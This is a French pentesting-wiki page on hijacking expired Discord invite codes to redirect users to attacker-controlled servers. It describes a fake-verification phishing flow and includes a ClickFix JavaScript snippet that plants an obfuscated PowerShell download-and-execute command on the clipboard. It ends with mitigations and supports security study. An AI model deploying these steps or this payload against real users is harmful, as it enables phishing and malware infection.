# Détournement d'invitation Discord

{{#include ../../banners/hacktricks-training.md}}

La vulnérabilité du système d'invitation de Discord permet aux acteurs malveillants de revendiquer des codes d'invitation expirés ou supprimés (temporaires, permanents ou personnalisés) en tant que nouveaux liens personnalisés sur n'importe quel serveur boosté de niveau 3. En normalisant tous les codes en minuscules, les attaquants peuvent pré-enregistrer des codes d'invitation connus et détourner silencieusement le trafic une fois que le lien original expire ou que le serveur source perd son boost.

## Types d'invitation et risque de détournement

| Type d'invitation     | Détournable ? | Condition / Commentaires                                                                                   |
|-----------------------|---------------|------------------------------------------------------------------------------------------------------------|
| Lien d'invitation temporaire | ✅          | Après expiration, le code devient disponible et peut être réenregistré en tant qu'URL personnalisée par un serveur boosté. |
| Lien d'invitation permanent | ⚠️          | S'il est supprimé et ne contient que des lettres minuscules et des chiffres, le code peut redevenir disponible.        |
| Lien personnalisé     | ✅          | Si le serveur original perd son boost de niveau 3, son invitation personnalisée devient disponible pour un nouvel enregistrement.    |

## Étapes d'exploitation

1. Reconnaissance
- Surveillez les sources publiques (forums, réseaux sociaux, canaux Telegram) pour des liens d'invitation correspondant au modèle `discord.gg/{code}` ou `discord.com/invite/{code}`.
- Collectez les codes d'invitation d'intérêt (temporaires ou personnalisés).
2. Pré-enregistrement
- Créez ou utilisez un serveur Discord existant avec des privilèges de boost de niveau 3.
- Dans **Paramètres du serveur → URL personnalisée**, essayez d'assigner le code d'invitation cible. S'il est accepté, le code est réservé par le serveur malveillant.
3. Activation du détournement
- Pour les invitations temporaires, attendez que l'invitation originale expire (ou supprimez-la manuellement si vous contrôlez la source).
- Pour les codes contenant des majuscules, la variante en minuscules peut être revendiquée immédiatement, bien que la redirection ne s'active qu'après expiration.
4. Redirection silencieuse
- Les utilisateurs visitant l'ancien lien sont envoyés sans problème vers le serveur contrôlé par l'attaquant une fois le détournement actif.

## Flux de phishing via le serveur Discord

1. Restreindre les canaux du serveur afin qu'un seul canal **#verify** soit visible.
2. Déployer un bot (par exemple, **Safeguard#0786**) pour inciter les nouveaux venus à se vérifier via OAuth2.
3. Le bot redirige les utilisateurs vers un site de phishing (par exemple, `captchaguard.me`) sous le prétexte d'une étape CAPTCHA ou de vérification.
4. Implémenter le truc UX **ClickFix** :
- Afficher un message CAPTCHA cassé.
- Guider les utilisateurs pour ouvrir la boîte de dialogue **Win+R**, coller une commande PowerShell préchargée et appuyer sur Entrée.

### Exemple d'injection de presse-papiers ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Cette approche évite les téléchargements de fichiers directs et utilise des éléments d'interface utilisateur familiers pour réduire la suspicion des utilisateurs.

## Atténuations

- Utilisez des liens d'invitation permanents contenant au moins une lettre majuscule ou un caractère non alphanumérique (jamais expirés, non réutilisables).
- Faites régulièrement tourner les codes d'invitation et révoquez les anciens liens.
- Surveillez l'état de boost du serveur Discord et les revendications d'URL personnalisées.
- Éduquez les utilisateurs à vérifier l'authenticité du serveur et à éviter d'exécuter des commandes collées depuis le presse-papiers.

## Références

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
